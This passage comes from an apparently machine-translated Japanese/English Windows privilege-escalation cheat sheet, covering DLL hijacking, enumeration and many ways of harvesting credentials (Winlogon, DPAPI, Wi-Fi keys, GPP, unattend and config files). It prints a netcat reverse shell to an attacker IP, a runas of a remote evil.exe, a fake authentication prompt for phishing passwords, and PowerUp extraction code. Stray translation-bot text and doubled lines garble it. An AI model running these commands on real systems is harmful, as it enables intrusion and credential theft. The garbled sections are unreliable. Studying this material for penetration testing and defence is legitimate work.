DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
開発者向けの緩和策
- デバイスオブジェクトを DACL で制限する目的で作成する場合は、常に FILE_DEVICE_SECURE_OPEN を設定する。
- 特権操作では呼び出し元のコンテキストを検証する。プロセス終了やハンドル返却を許可する前に PP/PPL チェックを追加する。
- IOCTLs を制限する（access masks、METHOD_*、入力検証）および直接カーネル特権を与えるのではなくブローカーモデルを検討する。

防御者向けの検出アイデア
- 疑わしいデバイス名（例: \\ .\\amsdk*）へのユーザーモードからのオープンや、悪用を示す特定の IOCTL シーケンスを監視する。
- Microsoft の脆弱なドライバのブロックリスト（HVCI/WDAC/Smart App Control）を適用し、独自の許可/拒否リストを維持する。


## PATH DLL Hijacking

もし **write permissions inside a folder present on PATH** がある場合、プロセスが読み込む DLL をハイジャックし、**escalate privileges** できる可能性がある。

Check permissions of all folders inside PATH:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
このチェックを悪用する方法の詳細については、次を参照してください：

{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## ネットワーク

### 共有
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

hosts file にハードコードされている他の既知のコンピュータを確認する
```
type C:\Windows\System32\drivers\etc\hosts
```
### ネットワークインターフェースと DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### オープンポート

外部から**制限されたサービス**が存在するか確認する
```bash
netstat -ano #Opened ports?
```
### ルーティングテーブル
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP テーブル
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### ファイアウォールルール

[**Check this page for Firewall related commands**](../basic-cmd-for-pentesters.md#firewall) **(ルールの一覧表示、ルールの作成、無効化、無効化...)**

さらに[ commands for network enumeration here](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
バイナリ `bash.exe` は `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` にもあります。

root user を取得すると、任意のポートで listen できます（`nc.exe` を使って最初にポートを listen すると、GUI で `nc` を firewall によって許可するか尋ねられます）。
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
簡単に root として bash を起動するには、`--default-user root` を試してください。

フォルダ `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` で `WSL` ファイルシステムを参照できます。

## Windows 資格情報

### Winlogon 資格情報
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### 資格情報マネージャ / Windows vault

出典: [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\  
Windows Vaultは、サーバー、ウェブサイト、その他のプログラム用のユーザー資格情報を保存します。これらは**Windows**が**ユーザーを自動的にログインさせる**ためのものです。第一印象では、ユーザーがFacebookやTwitter、Gmailなどの資格情報を保存してブラウザで自動的にログインするようになる、と思うかもしれません。しかし、そうではありません。

Windows VaultはWindowsが自動的にログインできる資格情報を保存します。つまり、リソース（サーバーやウェブサイト）へアクセスするために資格情報が必要な**Windowsアプリケーションは**、**このCredential Manager** & Windows Vaultを利用して、ユーザーが毎回ユーザー名とパスワードを入力する代わりに保存された資格情報を使用できる、ということです。

アプリケーションがCredential Managerと連携しない限り、特定のリソースの資格情報を利用することはできないと思います。したがって、アプリケーションがvaultを利用したい場合は、何らかの方法でデフォルトのストレージvaultからそのリソースの資格情報を**credential managerと通信して要求する**必要があります。

Use the `cmdkey` to list the stored credentials on the machine.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
その後、保存された資格情報を使用するために`runas`を`/savecred`オプションとともに使用できます。次の例は SMB 共有経由でリモートバイナリを呼び出すものです。
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
提供された資格情報のセットを使って`runas`を実行する。
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
注意: mimikatz、lazagne、[credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html)、[VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html)、または[Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1)。

### DPAPI

The Data Protection API (DPAPI) は、データの対称暗号化の手段を提供します。主に Windows オペレーティング システム内で、非対称のプライベートキーの対称暗号化に使用されます。この暗号化は、エントロピーに大きく寄与するユーザーまたはシステムのシークレットを利用します。

**DPAPI enables the encryption of keys through a symmetric key that is derived from the user's login secrets**。システム暗号化のシナリオでは、システムのドメイン認証シークレットを利用します。

DPAPI を使って暗号化されたユーザーの RSA 鍵は、`%APPDATA%\Microsoft\Protect\{SID}` ディレクトリに格納されます。ここで `{SID}` はユーザーの [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) を表します。**The DPAPI key, co-located with the master key that safeguards the user's private keys in the same file** は通常 64 バイトのランダムデータで構成されます。（このディレクトリへのアクセスは制限されており、CMD の `dir` コマンドでは内容を一覧できませんが、PowerShell では一覧できる点に注意してください。）
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
適切な引数（`/pvk` または `/rpc`）を指定して、**mimikatz module** `dpapi::masterkey` を使用してそれを復号できます。

**マスターパスワードで保護された資格情報ファイル** は通常次の場所にあります:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
適切な `/masterkey` を指定して **mimikatz module** `dpapi::cred` を使用して復号できます。  
root の場合、`sekurlsa::dpapi` module を使用して **memory** から多数の **DPAPI** **masterkeys** を抽出できます。

{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell 資格情報

PowerShell 資格情報は、暗号化された資格情報を便利に保存する方法として、scripting や automation タスクでよく使用されます。これらの資格情報は DPAPI によって保護されており、通常は作成されたのと同じユーザーが同じコンピュータ上でのみ復号できます。

ファイル内の PS 資格情報を **decrypt** するには、次のようにします：
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### 保存された RDP 接続

次の場所で見つかります: `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
および `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### 最近実行したコマンド
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **リモートデスクトップ資格情報マネージャー**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Use the **Mimikatz** `dpapi::rdg` module with appropriate `/masterkey` to **decrypt any .rdg files**\
適切な `/masterkey` を指定して **Mimikatz** `dpapi::rdg` モジュールを使用すると、任意の .rdg ファイルを **復号化** できます。\
You can **extract many DPAPI masterkeys** from memory with the Mimikatz `sekurlsa::dpapi` module\
メモリから多くの DPAPI マスターキーを **抽出** するには、Mimikatz `sekurlsa::dpapi` モジュールを使用できます。

### Sticky Notes

People often use the StickyNotes app on Windows workstations to **save passwords** and other information, not realizing it is a database file. This file is located at `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` and is always worth searching for and examining.\
Windows ワークステーションでは StickyNotes アプリを使ってパスワードやその他の情報を **保存** していることがよくありますが、それがデータベースファイルであることに気づいていない場合が多いです。該当ファイルは `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` にあり、常に検索して調査する価値があります。

### AppCmd.exe

**Note that to recover passwords from AppCmd.exe you need to be Administrator and run under a High Integrity level.**\
**AppCmd.exe** is located in the `%systemroot%\system32\inetsrv\` directory.\
If this file exists then it is possible that some **credentials** have been configured and can be **recovered**.\
**AppCmd.exe からパスワードを回復するには、管理者権限であり、High Integrity レベルで実行する必要があることに注意してください。**\
**AppCmd.exe** は `%systemroot%\system32\inetsrv\` ディレクトリにあります。\
このファイルが存在する場合、いくつかの **credentials** が構成されており **回復** できる可能性があります。

This code was extracted from [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):\
このコードは [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) から抽出されました:
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

`C:\Windows\CCM\SCClient.exe` が存在するか確認する .\
インストーラーは **run with SYSTEM privileges**, 多くは **DLL Sideloading (Info from** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).** に対して脆弱です。
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## ファイルとレジストリ (Credentials)

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH Host Keys
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### レジストリ内の SSH キー

SSH のプライベートキーはレジストリキー `HKCU\Software\OpenSSH\Agent\Keys` に保存されていることがあるため、そこに何か興味深いものがないか確認してください:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
そのパス内にエントリを見つけた場合、それはおそらく保存された SSH key です。これは暗号化された状態で保存されていますが、[https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract) を使用して簡単に復号できます。\
この手法の詳細は次を参照してください: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

もし `ssh-agent` サービスが実行されておらず、起動時に自動的に開始させたい場合は次を実行してください:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> この手法はもう有効ではないようです。いくつかの ssh keys を作成し、`ssh-add` で追加して、ssh でマシンにログインしてみました。レジストリ HKCU\Software\OpenSSH\Agent\Keys は存在せず、procmon は非対称鍵認証中に `dpapi.dll` の使用を検出しませんでした。

### 放置されたファイル
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
これらのファイルは **metasploit** を使って検索することもできます: _post/windows/gather/enum_unattend_

例の内容:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM & SYSTEM のバックアップ
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### クラウド認証情報
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

### キャッシュされた GPP パスワード

かつて、Group Policy Preferences (GPP) を使用して複数のマシンに対してカスタムのローカル管理者アカウントを配布する機能がありました。しかし、この手法には重大なセキュリティ上の欠陥がありました。第一に、SYSVOL に XML ファイルとして格納される Group Policy Objects (GPOs) は任意のドメインユーザーが参照可能でした。第二に、これらの GPP に含まれるパスワードは、公開されているデフォルトキーを用いて AES256 で暗号化されていましたが、そのキーは既知であるため、認証済みユーザーであれば誰でも復号できました。これにより、ユーザーが権限を昇格させる可能性がある深刻なリスクが生じていました。

このリスクを軽減するため、ローカルにキャッシュされた GPP ファイルのうち "cpassword" フィールドが空でないものをスキャンする関数が作成されました。該当するファイルを見つけると、その関数はパスワードを復号し、カスタム PowerShell オブジェクトを返します。このオブジェクトには GPP の詳細やファイルの場所が含まれ、脆弱性の特定と修復に役立ちます。

Search in `C:\ProgramData\Microsoft\Group Policy\history` or in _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history**（Windows Vista より前）_ for these files:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**cPassword を復号するには：**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
crackmapexecを使用してパスワードを取得する:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS の Web 設定
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
資格情報を含む web.config の例:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN の資格情報
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### ログ
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### ユーザーにcredentialsを尋ねる

ユーザーがそれらを知っている可能性があると思えば、常に**ユーザーに自身のcredentials、あるいは別のユーザーのcredentialsを入力するよう求めることができます**（ただし、クライアントに**尋ねること**で**credentials**を直接要求するのは非常に**リスクが高い**ことに注意してください):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **認証情報を含む可能性のあるファイル名**

以前に **passwords** が **clear-text** または **Base64** で含まれていた既知のファイル
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
I don't have the contents of src/windows-hardening/windows-local-privilege-escalation/README.md. Please paste the file text (or the files you want searched/translated). Once you provide the content, I'll translate the English text to Japanese per your rules and keep the exact markdown/html syntax.
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### Credentials in the RecycleBin

Binも確認して、その中にcredentialsがないか探してください

いくつかのプログラムに保存された**passwords**を復元するには、次を使用できます: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Inside the registry

**credentialsを持つその他のレジストリキー**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### ブラウザ履歴

Chrome や Firefox のパスワードが保存されている dbs を確認してください。\
また、ブラウザの履歴、ブックマーク、お気に入りも確認して、そこにパスワードが保存されている可能性があります。

ブラウザからパスワードを抽出するためのツール:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL の上書き**

Component Object Model (COM) は、Windows オペレーティングシステム内に組み込まれた技術で、異なる言語のソフトウェアコンポーネント間の相互通信を可能にします。各 COM コンポーネントは class ID (CLSID) によって識別され、各コンポーネントは1つ以上のインターフェースを介して機能を公開し、それらは interface IDs (IIDs) によって識別されます。

COM クラスとインターフェースは、それぞれレジストリの **HKEY\CLASSES\ROOT\CLSID** と **HKEY\CLASSES\ROOT\Interface** に定義されています。このレジストリは **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** をマージして作成され、結果が **HKEY\CLASSES\ROOT** になります。

Inside the CLSIDs of this registry you can find the child registry **InProcServer32** which contains a **default value** pointing to a **DLL** and a value called **ThreadingModel** that can be **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single or Multi) or **Neutral** (Thread Neutral).

![](<../../images/image (729).png>)

基本的に、実行される任意の **DLLs** を上書きできれば、その DLL が別のユーザーによって実行される場合に **権限昇格** が可能になります。

攻撃者が COM Hijacking を永続化メカニズムとしてどのように使用するかを学ぶには、次を参照してください:


{{#ref}}
com-hijacking.md
{{#endref}}

### **ファイル・レジストリ内での一般的なパスワード検索**

**ファイルの内容を検索する**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**特定のファイル名を持つファイルを検索する**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**レジストリ内でキー名とパスワードを検索する**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### パスワードを検索するツール

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **msf用の** プラグインで、被害者内部でcredentialsを検索するすべての metasploit POST module を自動的に実行します。\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) は、このページに記載されているパスワードを含むすべてのファイルを自動的に検索します。\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) は、システムからパスワードを抽出する優れたツールです。

ツール [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) は、これらのデータを平文で保存するいくつかのツール（PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP）の**セッション**、**ユーザー名**、**パスワード**を検索します。
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

次の状況を想像してください：**SYSTEMとして動作しているプロセスが `OpenProcess()` を使って、**full access** を持つ新しいプロセスを開く**。同じプロセスが `CreateProcess()` を使用して、**low privileges** だがメインプロセスのすべての open handles を継承する新しいプロセスを作成する**。\
その後、もし**low privileged process** に対して **full access** を持っていれば、`OpenProcess()` で作成された特権プロセスへの **open handle** を取得して **shellcode を注入** できます。\
[Read this example for more information about **how to detect and exploit this vulnerability**.](leaked-handle-exploitation.md)\
[Read this **other post for a more complete explanation on how to test and abuse more open handlers of processes and threads inherited with different levels of permissions (not only full access)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

共有メモリセグメント、いわゆる **pipes** は、プロセス間の通信とデータ転送を可能にします。

Windows は **Named Pipes** という機能を提供しており、異なるネットワーク上にある無関係なプロセス間でもデータ共有が可能です。これはクライアント/サーバーの構成に似ており、役割は **named pipe server** と **named pipe client** に分かれます。

クライアントがパイプ経由でデータを送信すると、そのパイプを設定した **server** は必要な **SeImpersonate** 権限を持っている場合、**client の identity を引き継ぐ** ことができます。あなたが模倣できるパイプで通信する **privileged process** を見つけられれば、そのプロセスがあなたの作成したパイプとやり取りするときにその identity を採用することで **より高い権限を得る** チャンスが生まれます。この攻撃の実行手順については、[**here**](named-pipe-client-impersonation.md) と [**here**](#from-high-integrity-to-system) を参照してください。

また、次のツールは **burp のようなツールで named pipe の通信をインターセプトする** ために使えます: [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **また別のツールは privescs を見つけるためにすべてのパイプを列挙・表示することができます** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Misc

### File Extensions that could execute stuff in Windows

ページ **[https://filesec.io/](https://filesec.io/)** を参照してください。

### **Monitoring Command Lines for passwords**

ユーザーとしてシェルを取得した際、スケジュールされたタスクやその他のプロセスが **コマンドラインで認証情報を渡す (pass credentials on the command line)** 場合があります。以下のスクリプトはプロセスのコマンドラインを2秒ごとに取得し、現状態と前回状態を比較して差分を出力します。
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Stealing passwords from processes

## From Low Priv User to NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

